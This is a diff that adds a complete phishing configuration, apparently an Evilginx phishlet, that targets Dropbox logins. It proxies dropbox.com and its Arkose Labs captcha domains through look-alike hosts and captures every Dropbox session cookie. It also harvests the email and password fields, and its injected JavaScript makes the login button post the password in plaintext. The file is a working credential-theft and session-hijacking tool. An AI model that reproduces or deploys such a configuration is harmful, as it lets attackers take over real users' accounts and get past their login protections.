@@ -1,0 +1,64 @@
+author: '@charlesbel'
+min_ver: '2.3.0'
+
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'dropbox.com', session: true, is_landing: true}
+  - {phish_sub: 'dropbox-api', orig_sub: 'dropbox-api', domain: 'arkoselabs.com', session: false, is_landing: false}
+  - {phish_sub: 'client-api', orig_sub: 'client-api', domain: 'arkoselabs.com', session: false, is_landing: false}
+  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'arkoselabs.com', session: false, is_landing: false}
+
+sub_filters:
+  - {triggers_on: 'www.dropbox.com', orig_sub: 'www', domain: 'dropbox.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.dropbox.com', orig_sub: 'cfl', domain: 'dropboxstatic.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.dropbox.com', orig_sub: 'dropbox-api', domain: 'arkoselabs.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.dropbox.com', orig_sub: 'client-api', domain: 'arkoselabs.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.dropbox.com', orig_sub: 'cdn', domain: 'arkoselabs.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+auth_tokens:
+  - domain: '.dropbox.com'
+    keys: ['.*,regexp']
+auth_urls:
+  - '/personal'
+  - '/page_success/.*'
+
+credentials:
+  username:
+    key: 'login_email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'login_password_unenc'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'www.dropbox.com'
+  path: '/login'
+
+js_inject:
+  - trigger_domains: ["www.dropbox.com"]
+    trigger_paths: ["/login"]
+    trigger_params: []
+    script: |
+      function onclickListener(){
+        var submit = document.querySelectorAll('button[type=submit]')[0];
+        submit.setAttribute("onclick", "sendPass()");
+        return;
+      }
+      function sendPass(){
+        var password = document.getElementsByName("login_password")[0].value;
+
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", '/ajax_login', true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("login_password_unenc="+encodeURIComponent(password));
+
+        return;
+      }
+      setTimeout(function(){ onclickListener(); }, 1000);
+
+force_post:
+  - path: '/ajax_login'
+    force:
+      - {key: 'remember_me', value: 'true'}
+    type: 'post'
